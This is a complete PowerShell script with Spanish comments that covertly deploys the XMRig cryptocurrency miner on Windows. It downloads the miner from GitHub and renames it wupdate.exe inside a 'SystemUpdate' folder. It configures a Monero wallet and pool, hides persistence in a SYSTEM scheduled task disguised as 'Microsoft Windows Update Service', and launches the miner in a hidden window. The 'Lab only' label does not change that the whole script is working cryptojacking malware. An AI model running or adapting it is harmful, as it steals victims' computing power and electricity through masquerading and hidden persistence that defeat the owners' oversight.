# === DEPLOY XMRig MINERO - Silencioso + Persistente (Versión corregida - Lab only) ===
$installPath = "C:\ProgramData\SystemUpdate"
New-Item -ItemType Directory -Path $installPath -Force | Out-Null

# Descarga y descomprime XMRig v6.25.0
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force

# Ruta correcta: el ejecutable está dentro de la subcarpeta xmrig-6.25.0
$xmrigExe = "$installPath\xmrig-6.25.0\xmrig.exe"

# Stealth: copiamos y renombramos a wupdate.exe en la raíz
Copy-Item $xmrigExe "$installPath\wupdate.exe" -Force

# Configuración con tu wallet + 50% núcleos
$configContent = @'
{
    "autosave": true,
    "cpu": {
        "max-threads-hint": 50
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ],
    "background": false,
    "log-file": null
}
'@
$configPath = "$installPath\config.json"
$configContent | Out-File -FilePath $configPath -Encoding utf8 -Force

# Persistencia: tarea programada como SYSTEM (invisible)
$taskName = "Microsoft Windows Update Service"
$exePath = "$installPath\wupdate.exe"

$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -ArgumentList @("-NoProfile", "-WindowStyle", "Hidden", "-Command", "& '$exePath' -c '$configPath'")

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# Ejecutar inmediatamente sin ventana
Start-Process powershell.exe -ArgumentList @("-NoProfile", "-WindowStyle", "Hidden", "-Command", "& '$exePath' -c '$configPath'") -WindowStyle Hidden

Write-Output "=== Minero desplegado y persistente correctamente (versión corregida) ==="
